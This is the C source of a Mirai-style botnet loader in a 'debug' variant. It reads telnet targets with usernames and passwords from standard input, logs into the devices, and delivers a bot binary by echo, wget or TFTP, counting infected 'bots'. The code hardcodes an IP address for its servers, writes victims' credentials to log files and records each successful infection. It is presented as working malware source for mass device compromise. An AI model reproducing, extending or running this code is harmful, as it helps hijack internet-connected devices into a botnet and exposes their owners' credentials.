#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"
#include "headers/config.h"

static void *stats_thread(void *);
static void *debug_logger_thread(void *);
static void log_success(const char *target, const char *arch, const char *method);

char *id_tag = "loader_debug";
static struct server *srv;
FILE *debug_log = NULL;
FILE *success_log = NULL;
pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;

int main(int argc, char **args)
{
    pthread_t stats_thrd, debug_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;
    time_t now;
    char timestamp[64];

    // Initialize debug logging
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));
    
    char debug_filename[256];
    char success_filename[256];
    snprintf(debug_filename, sizeof(debug_filename), "/root/loader/debug_%s.log", timestamp);
    snprintf(success_filename, sizeof(success_filename), "/root/loader/success_%s.log", timestamp);
    
    debug_log = fopen(debug_filename, "w");
    success_log = fopen(success_filename, "w");
    
    if (!debug_log || !success_log) {
        printf("Failed to open debug/success log files\n");
        return 1;
    }
    
    fprintf(debug_log, "=== DEBUG LOADER STARTED ===\n");
    fprintf(debug_log, "Timestamp: %s\n", timestamp);
    fprintf(debug_log, "PID: %d\n", getpid());
    fflush(debug_log);

    addrs_len = 1;
    addrs = calloc(4, sizeof(ipv4_t));
    addrs[0] = inet_addr("185.247.117.214");

    if (argc == 2)
    {
        id_tag = args[1];
        fprintf(debug_log, "Using ID tag: %s\n", id_tag);
    }
    
    fprintf(debug_log, "Initializing binary system...\n");
    if(!binary_init())
    {
        fprintf(debug_log, "ERROR: Failed to initialize binary system\n");
        fclose(debug_log);
        fclose(success_log);
        return 1;
    }
    fprintf(debug_log, "Binary system initialized successfully\n");

    // Enhanced thread count and connection limits for debug version
    int thread_count = sysconf(_SC_NPROCESSORS_ONLN) * 2; // Reduced for better debugging
    int max_connections = 1024 * 16; // Reduced for better debugging
    
    fprintf(debug_log, "Creating server with %d threads, max connections: %d\n", thread_count, max_connections);
    
    if((srv = server_create(thread_count, addrs_len, addrs, max_connections, HTTP_SERVER, HTTP_PORT, TFTP_SERVER)) == NULL)
    {
        fprintf(debug_log, "ERROR: Failed to create server\n");
        fclose(debug_log);
        fclose(success_log);
        return 1;
    }
    fprintf(debug_log, "Server created successfully\n");

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);
    pthread_create(&debug_thrd, NULL, debug_logger_thread, NULL);

    fprintf(debug_log, "Starting main processing loop...\n");
    fflush(debug_log);

    while(TRUE)
    {
        char strbuf[1024];

        if(fgets(strbuf, sizeof(strbuf), stdin) == NULL)
        {
            fprintf(debug_log, "EOF received, breaking main loop\n");
            break;
        }

        util_trim(strbuf);

        if(strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        fprintf(debug_log, "Processing target: %s\n", strbuf);
        
        memset(&info, 0, sizeof(struct telnet_info));
        if(telnet_info_parse(strbuf, &info) == NULL)
        {
            fprintf(debug_log, "Failed to parse target: %s\n", strbuf);
        }
        else
        {
            if(srv == NULL)
            {
                fprintf(debug_log, "ERROR: Server is NULL when trying to queue target\n");
            }
            else
            {
                fprintf(debug_log, "Queuing target: %d.%d.%d.%d:%d user=%s pass=%s\n", 
                    info.addr & 0xff, (info.addr >> 8) & 0xff, (info.addr >> 16) & 0xff, (info.addr >> 24) & 0xff,
                    ntohs(info.port), info.user, info.pass);
                
                server_queue_telnet(srv, &info);
                
                // Reduced sleep frequency for faster processing
                if(total++ % 1000 == 0) {
                    usleep(100000); // 0.1 second
                    fprintf(debug_log, "Processed %d targets so far\n", total);
                }
            }
        }

        ATOMIC_INC(&srv->total_input);
    }

    fprintf(debug_log, "Waiting for connections to close...\n");
    while(ATOMIC_GET(&srv->curr_open) > 0) {
        sleep(1);
        fprintf(debug_log, "Still %d connections open\n", ATOMIC_GET(&srv->curr_open));
    }

    fprintf(debug_log, "=== DEBUG LOADER FINISHED ===\n");
    fclose(debug_log);
    fclose(success_log);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while(TRUE)
    {
        printf("\x1b[0;36m[\x1b[0;37m%ds\x1b[0;36m] \x1b[0;31mDEBUG_LOADER \x1b[0;37m- \x1b[0;35mBOTS: [\x1b[0;37m%d\x1b[0;36m] Logins: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Success: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Failures: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] \x1b[0;37m-> Echoes: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Wgets: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] TFTPs: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m]\x1b[0;37m\n",
        seconds++, ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
        ATOMIC_GET(&srv->total_failures), ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
        fflush(stdout);
        sleep(1);
    }
}

static void *debug_logger_thread(void *arg)
{
    while(TRUE)
    {
        sleep(30);
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "=== STATUS UPDATE ===\n");
            fprintf(debug_log, "Active connections: %d\n", ATOMIC_GET(&srv->curr_open));
            fprintf(debug_log, "Total logins: %d\n", ATOMIC_GET(&srv->total_logins));
            fprintf(debug_log, "Total successes: %d\n", ATOMIC_GET(&srv->total_successes));
            fprintf(debug_log, "Total failures: %d\n", ATOMIC_GET(&srv->total_failures));
            fprintf(debug_log, "Total echoes: %d\n", ATOMIC_GET(&srv->total_echoes));
            fprintf(debug_log, "Total wgets: %d\n", ATOMIC_GET(&srv->total_wgets));
            fprintf(debug_log, "Total tftps: %d\n", ATOMIC_GET(&srv->total_tftps));
            fprintf(debug_log, "====================\n");
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }
}

static void log_success(const char *target, const char *arch, const char *method)
{
    time_t now;
    char timestamp[64];
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    pthread_mutex_lock(&log_mutex);
    if (success_log) {
        fprintf(success_log, "[%s] SUCCESS: %s | Arch: %s | Method: %s\n", 
                timestamp, target, arch, method);
        fflush(success_log);
    }
    if (debug_log) {
        fprintf(debug_log, "[%s] SUCCESS: %s | Arch: %s | Method: %s\n", 
                timestamp, target, arch, method);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);
}
